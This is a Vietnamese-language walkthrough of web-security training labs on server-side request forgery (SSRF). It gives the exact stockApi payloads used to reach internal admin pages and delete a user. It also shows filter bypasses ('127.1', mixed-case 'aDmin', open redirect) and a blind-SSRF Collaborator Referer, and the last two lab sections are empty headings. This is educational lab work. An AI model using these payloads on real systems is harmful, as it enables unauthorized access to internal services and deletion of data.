# 1. Basic SSRF against the local server
Truy cập /admin, ta nhận được thông báo: "Admin interface only available if logged in as an administrator, or if requested from loopback".

Khi sử dụng chức năng checkStock, request `POST /product/stock` với parameter `stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D3%26storeId%3D1`. Như vậy ta sẽ thử thay đổi stockApi để access trang admin với tư cách localhost.

Thay đổi tham số `stockApi=http://localhost/admin`, kết quả thành công.

![image](https://user-images.githubusercontent.com/103978452/205523955-5692177a-7acd-42ba-ac37-2f98bbff4ebb.png)

Thay đổi `stockApi=http://localhost/admin/delete?username=carlos` để giải bài lab.

# 2. Basic SSRF against another back-end system
Đưa request `POST /product/stock` vào Intruder với payload: `stockApi=http%3A%2F%2F192.168.0.0%3A8080`, thực hiện bruteforce chữ số cuối trong IP address với phạm vi từ 0 đến 255. Ta thấy chỉ với IP 192.168.0.151 thì hiển thị mã lỗi 404:

![image](https://user-images.githubusercontent.com/103978452/205553868-d23ea3bc-56bf-4d80-b9b9-1a4c891116c7.png)

Thay đổi tham số `stockApi=http%3A%2F%2F192.168.0.151%3A8080%2Fadmin`, ta truy cập trang admin thành công. Tiếp tục thay đổi thành `stockApi=http%3A%2F%2F192.168.0.151%3A8080%2Fadmin%2Fdelete?username=carlos` để xóa user carlos.
![image](https://user-images.githubusercontent.com/103978452/205554210-25fe920a-1573-4b04-93c7-10a8a9521c06.png)

# 3. SSRF with blacklist-based input filter
Thay đổi `stockApi=http://localhost` thì thấy thông báo lỗi "External stock check blocked for security reasons"

Thay đổi thành `stockApi=http://127.1`, kết quả thành công. Tuy nhiên khi truy cập admin `stockApi=http://127.1/admin` thì lại hiển thị lỗi. Như vậy có khả năng server đã chặn từ khóa "admin".

Ta thử thay đổi `stockApi=http://127.1/aDmin`, kết quả truy cập trang admin thành công. Sau đó lại đổi thành `stockApi=http://127.1/aDmin/delete?username=carlos`, kết quả user carlos bị xóa.

![image](https://user-images.githubusercontent.com/103978452/205544461-b7b85229-b774-4cea-8c2f-f2eaeff2db71.png)

# 4. SSRF with filter bypass via open redirection vulnerability
Thử với tham số `stockApi=http%3A%2F%2F192.168.0.12%3A8080%2Fadmin`, kết quả không thành công. Như vậy không thể sử dụng chức năng stock check để truy cập một URL trực tiếp như vậy.

Thử thay đổi tham số `stockApi=%2Fproduct%2FnextProduct%3FcurrentProductId%3D3%26path%3Dhttp%3A%2F%2F192.168.0.12%3A8080%2Fadmin`, ta thấy thành công và kết quả trả về là trang admin.

Để xóa user carlos, ta thay đổi tham số stockApi thành `stockApi=%2Fproduct%2FnextProduct%3FcurrentProductId%3D3%26path%3Dhttp%3A%2F%2F192.168.0.12%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos`. Kết quả thành công.

![image](https://user-images.githubusercontent.com/103978452/205566041-5c14d2f9-1c00-4743-86d5-7e45b055542b.png)

# 5. Blind SSRF with out-of-band detection
Trong request `GET /product?productId=2`, ta thay đổi header Refererer trỏ đến địa chỉ của Burp Collaborator server (`Referer: https://c9moh0mqbmk53klvhwgtfmzsmjs9gy.oastify.com`). Resend request, ta thấy trong Burp Collaborator client nhận được các request gửi đến. Bài lab được giải thành công.

![image](https://user-images.githubusercontent.com/103978452/205568329-61e71132-5286-4bec-a560-855a51002781.png)

# 6. SSRF with whitelist-based input filter

# 7. Blind SSRF with Shellshock exploitation
